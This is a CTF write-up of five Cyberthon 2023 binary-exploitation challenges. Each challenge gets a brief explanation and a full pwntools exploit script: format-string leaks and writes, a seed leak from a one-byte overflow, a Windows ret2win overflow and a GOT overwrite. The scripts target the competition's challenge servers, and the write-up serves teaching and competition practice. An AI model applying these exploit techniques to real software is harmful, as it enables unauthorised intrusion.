---
title: Cyberthon 2023
date: 2023-05-11
excerpt: Cyberthon 2023 - Allfoods, Flagmin, Passgen, Tune of Apocalypse, Wordpocalypse
category: writeups
tags:
  - pwn
---

Writeups for Cyberthon 2023 Pwn challenges

# Allfoods

This challenge is a simple format string read and write. In this case, full
RELRO is enabled so we can't overwrite the GOT. We can leak a stack address and
use it to calculate the address of RIP.

```py
from pwn import *

exe = ELF("./allfoods_patched")
libc = ELF("./libc.so.6")

context.binary = exe

def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.GDB:
            gdb.attach(p)
            pause()
    else:
        p = remote("chals.f.cyberthon23.ctf.sg", 43030)

    return p


def main():
    p = conn()

    # good luck pwning :)
    # 47 is pie, 45 is stack leak
    p.sendline(b"%47$p,%45$p")
    p.recvuntil(b"Here's your: ")
    pie = int(p.recvuntil(b",", drop=True), 16) - exe.sym.main
    print(hex(pie))
    exe.address = pie

    leak = int(p.recvline().strip(), 16)
    rip = leak - 0xf0

    p.sendline(b"%9$saaaa" + p64(exe.got.printf))
    p.recvuntil(b"Here's your: ")
    libc_base = u64(p.recvuntil(b"aaaa", drop=True).ljust(8, b'\0')) - libc.sym.printf
    print(hex(libc_base))
    libc.address = libc_base

    payload = fmtstr_payload(8, { rip: libc_base + 0xe3b01 })
    p.sendline(payload)

    p.interactive()


if __name__ == "__main__":
    main()
```

---

# Flagmin

This challenge is also a format string challenge using `snprintf`. The binary
checks if the parsed format string contains a "username-password" pair that was
randomly generated, then checks if the string ends with ":y".

The generated pairs are stored in the heap. We can use %s to get a
username:password pair since there are addresses on the stack pointing to the
generated strings. 

Since the binary appends :n to the end of our string, we need to somehow get
rid of it. `snprintf` takes an integer argument to indicate how many characters
to write to the output string. Extra characters after 0x80 are truncated, hence
we can use %c to push :n out of the string and put :y just before it.

```py
from pwn import *

exe = ELF("./flagmin_patched")

context.binary = exe

def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.GDB:
            gdb.attach(p)
            pause()
    else:
        p = remote("chals.f.cyberthon23.ctf.sg", 43040)

    return p


def main():
    p = conn()

    # good luck pwning :)
    p.sendline(b"%8$s")
    p.sendline(b"%16$s:%91c:y")

    p.interactive()


if __name__ == "__main__":
    main()
```

---

# Passgen

In this challenge, our goal is to leak the seed and hence guess the password
the binary generated.

In IDA, we can see that the seed is located in bss. In addition, `session` and
`dest` are located above the seed in bss too. Our input to the binary is stored
in `dest`, while the generated password is stored in `session`.

We also have a one-byte overflow in `strncpy` when the binary reads in our
name. Using this, we can overwrite the null byte between `dest` and `seed`,
hence leaking the seed. Then, we can use the seed to initialize `rand()` and
generate the same password as was generated in the binary.

```c
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv) {
  char v4[88];
  char out[33];
  int seed = atoi(argv[1]);
  srand(seed);
  strcpy(v4, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#" "$%^&*()-_=+[]{};:,.<>?");
  for (int i = 0; i < 32; ++i) {
    out[i] = v4[rand() % 87];
  }
    out[32] = 0;
    puts(out);
}
```

```py
from pwn import *
import os

exe = ELF("./passgen_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe

def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.GDB:
            gdb.attach(p)
            pause()
    else:
        p = remote("chals.f.cyberthon23.ctf.sg", 43050)

    return p


def main():
    p = conn()

    # good luck pwning :)
    payload = b"a"*257
    p.sendline(payload)
    p.recvuntil(b"a"*256)
    seed = u64(p.recvline().strip().ljust(8, b"\x00"))
    print(seed)

    password = os.popen(f"./seed/solve {seed}").read().strip()
    print(password)

    p.sendline(password.encode())

    p.interactive()


if __name__ == "__main__":
    main()
```

---

# Tune of Apocalypse

This is a Windows ret2win challenge. Most of the challenge is actually just red
herring/serves to make the challenge more approachable but tedious. We can use
IDA to analyse the executable.

In essence, the vulnerability is a buffer overflow in static region that allows
us to modify a reference to a error handler function, and change it to the win
function. There's only 1 `strlen` check to pass which we can easily bypass
using null bytes.

```py
from pwn import *

p = remote("chals.f.cyberthon23.ctf.sg", 43010)

secret_notes = [0x106, 0x19F, 0x14A, 0x126, 0x188, 0x15D, 0x1B8, 0x1B8, 0x115, 0x115, 0x172, 0x1D2, 0x188, 0x172, 0x188]

inputs = [9, 1, 3, 5, 6, 8, 10, 10, 2, 2, 11, 7, 7, 8, 8]

# p.sendlineafter(b"Choice:", b"1")
# for i in inputs:
#     p.sendlineafter(b"Choice:", str(i).encode())
#
# p.sendlineafter(b"Choice:", b"0")

p.sendlineafter(b"Choice:", b"3")

p.sendlineafter(b"Name:", b"asdf")

payload = b"\x00"*200 + b"\xec\x1c"
p.sendlineafter(b"Description:", payload)

p.sendlineafter(b"Choice:", b"3")

p.sendlineafter(b"Name:", b"a"*30)

print(p.clean())
```

---

# Wordpocalypse

This challenge involves overwriting the GOT using an array OOB. I struggled a
lot with trying to find a good function to overwrite, because the write is per
5 bytes and might overflow into other functions. Hence a good function must be
chosen to prevent the binary from crashing as we win the game and call our win
function.

The entire GOT is as shown below:
```
gef➤  got

GOT protection: Partial RelRO | GOT functions: 27

[0x404018] has_colors@NCURSES6_5.0.19991023  →  0x401030
[0x404020] putchar@GLIBC_2.2.5  →  0x401040
[0x404028] wbkgd@NCURSES6_5.0.19991023  →  0x401050
[0x404030] newwin@NCURSES6_5.0.19991023  →  0x401060
[0x404038] curs_set@NCURSES6_TINFO_5.0.19991023  →  0x401070
[0x404040] puts@GLIBC_2.2.5  →  0x7ffff7db9ed0
[0x404048] wborder@NCURSES6_5.0.19991023  →  0x401090
[0x404050] wgetch@NCURSES6_5.0.19991023  →  0x4010a0
[0x404058] noecho@NCURSES6_5.0.19991023  →  0x4010b0
[0x404060] setbuf@GLIBC_2.2.5  →  0x7ffff7dc1060
[0x404068] system@GLIBC_2.2.5  →  0x4010d0
[0x404070] printf@GLIBC_2.2.5  →  0x7ffff7d99770
[0x404078] initscr@NCURSES6_5.0.19991023  →  0x4010f0
[0x404080] wrefresh@NCURSES6_5.0.19991023  →  0x401100
[0x404088] start_color@NCURSES6_5.0.19991023  →  0x401110
[0x404090] keypad@NCURSES6_TINFO_5.0.19991023  →  0x401120
[0x404098] wattr_on@NCURSES6_5.0.19991023  →  0x401130
[0x4040a0] getchar@GLIBC_2.2.5  →  0x7ffff7dc0b60
[0x4040a8] mvprintw@NCURSES6_5.0.19991023  →  0x401150
[0x4040b0] init_pair@NCURSES6_5.0.19991023  →  0x401160
[0x4040b8] wmove@NCURSES6_5.0.19991023  →  0x401170
[0x4040c0] __isoc99_scanf@GLIBC_2.7  →  0x7ffff7d9b110
[0x4040c8] waddch@NCURSES6_5.0.19991023  →  0x401190
[0x4040d0] printw@NCURSES6_5.0.19991023  →  0x4011a0
[0x4040d8] exit@GLIBC_2.2.5  →  0x4011b0
[0x4040e0] endwin@NCURSES6_5.0.19991023  →  0x4011c0
[0x4040e8] wattr_off@NCURSES6_5.0.19991023  →  0x4011d0
```

`endwin` would have been a good candidate to overwrite, since it has a lot of
not so useful functions after it (`exit`, `printw`). But the win function
itself also calls `endwin`, and after I managed to overwrite `endwin` safely I
realized that it would result in infinite recursion. If I tried to skip past
the `endwin` call, it would result in stack alignment issues. 

Hence, the next best function to overwrite was `exit`. However, to write
completely to `exit`, it's necessary to overwrite the last byte of `endwin`. At
the point of our write, `endwin` hasn't been resolved yet, so the last byte is
always 0xc0. Besides that, the rest of the payload should be fairly
straightforward:

```py
from pwn import *

exe = ELF("./wordpocalypse")

context.binary = exe

def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.GDB:
            gdb.attach(p)
            pause()
    else:
        p = remote("chals.f.cyberthon23.ctf.sg", 43020)

    return p


def main():
    p = conn()

    # good luck pwning :)
    p.sendline(b"1")

    # p.sendline(b"-35")
    #
    # payload = b"\x14\x40\x00\x00\x00"
    # p.send(payload)
    #
    # payload = b"\x01\x00\x00\x00\xbc"
    # p.send(payload)
    #
    # p.send(b"havoc")

    p.sendline(b"-36")
    payload = b"\x00\x00\x00\x00\xc0"
    p.send(payload)

    payload = b"\x00\x76\x14\x40\x00"
    p.send(payload)

    p.send(b"havoc")

    p.interactive()


if __name__ == "__main__":
    main()
```
